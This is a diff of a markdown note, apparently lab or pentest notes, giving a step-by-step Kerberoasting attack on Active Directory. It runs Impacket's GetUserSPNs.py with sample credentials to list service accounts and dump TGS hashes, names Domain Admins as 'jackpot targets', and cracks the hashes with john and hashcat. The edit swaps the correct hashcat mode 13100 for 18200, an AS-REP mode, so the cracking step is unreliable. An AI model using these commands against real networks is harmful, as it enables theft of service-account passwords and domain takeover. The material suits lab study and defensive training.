@@ -1,53 +1,47 @@
- `We will use the following credentials: User=forend and password=Klmcargo2`
-## What is Kerberoasting (in simple words)?
 
-Think of a company’s internal network (Active Directory) like a big office where:
+**Kerberoasting targets service accounts that have an SPN (a service identifier).**
+- When a user asks to access a service, they receive a **Service Ticket (ST)**
+- This ticket is **encrypted using the service account’s password**
 
-- 🧍Users = Employees
-- 🖥️ Services (like SQL, IIS, etc.) = Office machines
-- 🔑 Kerberos = Security guard that hands out keys to access those services
+ If an attacker gets this ticket:
+- They can take it offline
+- Try to **crack it to find the service account password**
 
-Some office machines are assigned to specific employees (via SPNs – Service Principal Names). The Kerberos guard will give out a special encrypted **service ticket** (TGS) if you ask for one of these services.
-
-But here's the problem:
-
-> The service ticket is **encrypted using the password of the user who runs the service**. So if we can grab this ticket, we can try to **crack it offline** to get the **user’s password** – often this user is a service account with high privileges. This is **Kerberoasting**.
+> Kerberoasting requires valid domain user credentials to request a service ticket.
 
 ---
+#  What do you need before running Kerberoasting?
 
-## 🧰 What do you need before running Kerberoasting?
+-  You must have **valid domain user credentials**  
+-  You must be **able to query the domain controller**  
+-  You want to **find accounts that have SPNs set** (meaning they're running services
+#  Step-by-Step Attack From Linux (Using Impacket)
 
-✅ You must have **valid domain user credentials**  
-✅ You must be **able to query the domain controller**  
-✅ You want to **find accounts that have SPNs set** (meaning they're running services
+# 1.  Install Impacket
 
-
-#  **Step-by-Step Attack From Linux (Using Impacket)**
-
-### 1.  **Install Impacket**
 ```bash
 git clone https://github.com/fortra/impacket
 cd impacket
 sudo python3 -m pip install .
 ```
-### 2.  **List SPNs (Service Accounts)**
+# 2.  List SPNs (Service Accounts)
+
+Check kerberoastable users using the Impacket's module GetUserSPNs.py
 ```bash
-GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME>
+GetUserSPNs.py <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DC_IP OR DC_DOMAIN>
 
 # example
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc
 ```
 
-✅ You’ll be prompted for the password  
-✅ This will list service accounts like:
+It will searches for **accounts that have SPNs (service accounts)**
+ ![[Pasted image 20260415143235.png]]
+in this case there're two vulnerable users: 'kerberoasting' and 'angel'.
 
-- `MSSQLSvc/SERVER.DOMAIN.LOCAL:1433`
-- `backupjob/SERVER.DOMAIN.LOCAL`
+> **Check if any are Domain Admins!** Those are jackpot targets.
 
-📌 **Check if any are Domain Admins!** Those are jackpot targets.
+# 3.  **Request All TGS Ticket**
 
-
-## 3.  **Request All TGS Ticket**
 ```bash
 
 # **Request All TGS Tickets (for all SPNs)**
@@ -55,16 +49,29 @@ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request
 
 # Request Ticket for a Specific Account (Optiona)
 GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_ACCOUNT>
+
 #example
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapservice_tgs
+GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request #without specifing a user it checks all possible tickets
+GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request-user kerberoasting | grep '\$krb5tgs\$' > kerberoast.txt
 ```
 
+![[Pasted image 20260415150325.png]]
 
-## 4.  **Crack the TGS Ticket (Offline)**
+# 4.  **Crack the TGS Ticket (Offline)**
 
 ```bash
-hashcat -m 13100 hash.txt /path/to/wordlist.txt
+john --wordlist=/home/kali/Documents/password.txt ./kerberoast.txt
+
+hashcat -m 18200 ./kerberoast.txt /home/kali/Documents/password.txt
 ```
-Where:
-- `-m 13100` is the mode for Kerberos 5 TGS-REP
-- `hash.txt` contains the `$krb5tgs$...` ticket(s)
+![[Pasted image 20260415150436.png]]
+
+
+# Troubleshooting: Clock Skew Errors
+If you encounter `KRB_AP_ERR_SKEW (Clock skew too great)`, synchronize the clocks with:
+
+```bash
+sudo timedatectl set-ntp off
+ntpdate -q corp-dc
+ntpdate -u corp-dc
+```
